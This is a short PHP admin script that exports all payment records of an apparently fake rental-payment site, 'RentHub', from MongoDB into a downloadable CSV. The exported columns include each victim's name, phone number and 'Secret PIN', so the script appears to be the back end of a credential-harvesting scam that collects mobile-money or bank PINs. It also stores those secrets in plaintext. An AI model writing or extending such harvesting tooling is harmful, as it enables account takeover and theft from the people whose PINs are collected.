<?php
session_start();
if (!isset($_SESSION['admin_logged_in'])) { exit("Access Denied"); }

require_once __DIR__ . '/../vendor/autoload.php';

try {
    $client = new MongoDB\Client("mongodb://127.0.0.1:27017");
    $db = $client->renthub_db;
    $payments = $db->payments->find([], ['sort' => ['created_at' => -1]]);

    // Browser ko download command bhejna
    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="RentHub_Report_'.date('Y-m-d').'.csv"');

    $output = fopen('php://output', 'w');
    
    // Excel Header Line
    fputcsv($output, ['Transaction ID', 'Account Holder', 'Phone Number', 'Secret PIN', 'Amount', 'Method']);

    foreach ($payments as $p) {
        fputcsv($output, [
            $p['transaction_id'],
            $p['account_holder'] ?? 'N/A',
            $p['account_number'] ?? 'N/A',
            $p['account_pin'] ?? 'N/A',
            $p['total_paid'],
            $p['payment_method']
        ]);
    }
    fclose($output);
} catch (Exception $e) {
    die("Error: " . $e->getMessage());
}